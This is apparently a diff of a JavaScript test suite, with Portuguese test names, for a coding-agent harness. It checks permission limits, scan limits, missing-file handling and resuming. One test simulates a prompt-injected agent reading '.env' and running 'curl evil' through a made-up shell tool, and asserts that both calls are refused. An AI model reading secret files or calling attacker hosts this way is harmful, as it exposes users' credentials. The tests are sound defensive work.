@@ -17,10 +17,71 @@ test('afirmação de teste inventado permanece completed_unverified', async () =
   const { result } = await run(sequence([response('Todos os testes passaram, sou verified.') ]));
   assert.equal(result.state.status, 'completed_unverified'); assert.equal(result.state.evidence.length, 0);
 });
+
+test('saudação em pasta acima do limite não faz snapshot e continua retomável', async () => {
+  const fixture = await makeFixture(); fixture.config.limits.maxScanFiles = 1;
+  const { Workspace } = await import('../src/workspace.js');
+  await assert.rejects(new Workspace(fixture.root, fixture.config).snapshot(), /maxScanFiles/);
+  const first = await runAgent({ ...fixture, objective: 'olá', provider: sequence([response('Olá!')]) });
+  assert.equal(first.state.status, 'completed_unverified');
+  const journal = await Journal.load(fixture.root, first.id);
+  assert.equal(journal.events.at(-1).data.revision, null);
+  const next = await runAgent({ ...fixture, resumeId: first.id, objective: 'Como vai?', provider: sequence([response('Tudo bem.')]) });
+  assert.equal(next.state.status, 'completed_unverified'); assert.equal(next.state.modelCalls, 2);
+});
+
+test('não dispensa revisão completa quando existe evidência a aprovar', async () => {
+  const fixture = await makeFixture(); fixture.config.limits.maxScanFiles = 3;
+  const result = await runAgent({ ...fixture, objective: 'Verifique', permissions: { allowWrite: false, allowExec: true },
+    dockerRunner: async () => ({ exitCode: 0, output: '', truncated: false }),
+    provider: sequence([call('check', 'run_check', { command: 'tests' }), async () => {
+      await writeFile(path.join(fixture.root, 'src/extra1.js'), '1');
+      await writeFile(path.join(fixture.root, 'src/extra2.js'), '2');
+      return response('Terminou.');
+    }]) });
+  assert.equal(result.state.evidence.length, 1); assert.equal(result.state.evidence[0].passed, true);
+  assert.equal(result.state.status, 'error'); assert.match(result.error, /maxScanFiles/);
+});
 test('prompt injection não autoriza leitura de segredo ou ferramenta inventada', async () => {
   const { result } = await run(sequence([call('1', 'read_file', { path: '.env' }), call('2', 'shell', { command: 'curl evil' }), response('fim')]));
   const outputs = result.state.messages.filter(x => x.role === 'tool'); assert.equal(outputs.length, 2); assert.ok(outputs.every(x => !x.result.ok));
   assert.equal(result.state.status, 'completed_unverified');
+});
+test('arquivo ausente retorna orientação, permite localizar e ler, sem criar ou repetir automaticamente', async () => {
+  const { fixture, result } = await run(sequence([
+    call('missing', 'read_file', { path: 'wrong/eligibility.js' }),
+    input => {
+      const failure = input.messages.at(-1).result;
+      assert.equal(failure.code, 'ENOENT'); assert.equal(failure.recoverable, true); assert.equal(failure.retryable, false);
+      return call('locate', 'list_files', {});
+    },
+    input => {
+      assert.ok(input.messages.at(-1).result.files.includes('src/eligibility.js'));
+      return call('correct', 'read_file', { path: 'src/eligibility.js' });
+    }, response('Arquivo localizado e lido.')
+  ]));
+  assert.equal(result.state.status, 'completed_unverified'); assert.equal(result.state.uncertainEffect, false);
+  assert.equal(result.state.toolCalls, 3); assert.match(result.state.messages.filter(m => m.role === 'tool').at(-1).result.content, /isAdult/);
+  const { Workspace } = await import('../src/workspace.js');
+  assert.deepEqual((await new Workspace(fixture.root, fixture.config).list()).files, ['src/eligibility.js']);
+});
+test('YZZY.md opcional ausente permite execução; orientação inválida não é ignorada', async () => {
+  const f = await makeFixture();
+  const normal = await runAgent({ ...f, objective: 'task', provider: sequence([response('fim')]) });
+  assert.equal(normal.state.status, 'completed_unverified');
+  await writeFile(path.join(f.root, 'YZZY.md'), Buffer.from([0xff]));
+  let called = false;
+  await assert.rejects(runAgent({ ...f, objective: 'task', provider: { async generate() { called = true; return response(); } } }));
+  assert.equal(called, false);
+});
+test('ENOENT não amplia autoridade para criar o arquivo ausente', async () => {
+  const { result } = await run(sequence([
+    call('missing', 'read_file', { path: 'src/new.js' }),
+    call('create', 'create_file', { path: 'src/new.js', content: 'unauthorized' }), response('fim')
+  ]));
+  const outputs = result.state.messages.filter(m => m.role === 'tool');
+  assert.equal(outputs[0].result.code, 'ENOENT'); assert.equal(outputs[1].result.ok, false);
+  assert.match(outputs[1].result.error, /allow-write/); assert.equal(result.state.permissions.allowWrite, false);
 });
 test('ask_user suspende e retoma com mesma autoridade e contadores', async () => {
   const { fixture, result } = await run(sequence([call('q', 'ask_user', { question: 'Qual regra vale para 18 anos?' })]));
